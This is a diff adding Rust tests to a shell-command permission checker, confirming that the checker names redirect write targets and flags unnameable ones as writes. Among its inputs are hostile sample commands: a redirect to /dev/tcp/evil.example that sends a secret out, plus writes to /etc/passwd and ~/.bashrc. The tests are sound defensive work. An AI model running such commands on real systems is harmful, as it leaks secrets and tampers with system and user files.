@@ -764,3 +764,68 @@ fn an_env_key_is_a_writable_config_entry() {
     // Granting one variable grants exactly one.
     assert!(!safe.contains_key(&format!("{KEY_PREFIX}env:PATH")));
 }
+
+// ─── Where a redirect may write (issue #289) ─────────────────────────────────
+
+/// A discarded write is not a write, so nothing here needs confining. Pinned as
+/// hard as the dangerous cases: charging a workspace check to `2>/dev/null`
+/// would make the common shape fail for no gain.
+#[test]
+fn a_discarded_redirect_names_no_target() {
+    for command in [
+        "cmd 2>/dev/null",
+        "cmd > /dev/null 2>&1",
+        "ninja &> /dev/null",
+        "cmd > NUL",
+        "sort < in",
+        "ls 2>&1",
+    ] {
+        assert!(
+            write_target_paths(command).is_empty(),
+            "{command:?} should name no write target"
+        );
+    }
+}
+
+#[test]
+fn a_literal_redirect_names_its_target() {
+    assert_eq!(write_target_paths("echo x > out.txt"), ["out.txt"]);
+    assert_eq!(write_target_paths("cat a >> /etc/passwd"), ["/etc/passwd"]);
+    assert_eq!(write_target_paths("cat <> /tmp/rw"), ["/tmp/rw"]);
+}
+
+/// Both redirects on a line are named, so confining the first cannot be dodged
+/// by putting the escape second.
+#[test]
+fn every_redirect_on_a_line_is_named() {
+    assert_eq!(
+        write_target_paths("echo a > one.txt; echo b > ../two.txt"),
+        ["one.txt", "../two.txt"],
+    );
+}
+
+/// A target this cannot name has no path to check, so it is absent here - and
+/// it is already ungrantable and prompts every time, which is its containment.
+/// The second assertion is the one that matters: absent from this list must not
+/// mean absent from [`writes_a_file`], or the escape would be silent.
+#[test]
+fn an_unnameable_target_is_not_a_path_but_is_still_a_write() {
+    for command in [
+        "echo x > $OUT",
+        r#"echo x > "$HOME/.bashrc""#,
+        "echo secret > /dev/tcp/evil.example/9999",
+    ] {
+        assert!(write_target_paths(command).is_empty(), "{command:?}");
+        assert!(writes_a_file(command), "{command:?} is still a write");
+    }
+}
+
+/// A line too malformed to tokenize names nothing here and is already treated
+/// as writing. The two must fail in that direction: naming no target while
+/// claiming no write is the shape that would let something through.
+#[test]
+fn an_unparseable_line_names_nothing_but_still_counts_as_writing() {
+    let malformed = "echo 'unterminated";
+    assert!(write_target_paths(malformed).is_empty());
+    assert!(writes_a_file(malformed));
+}
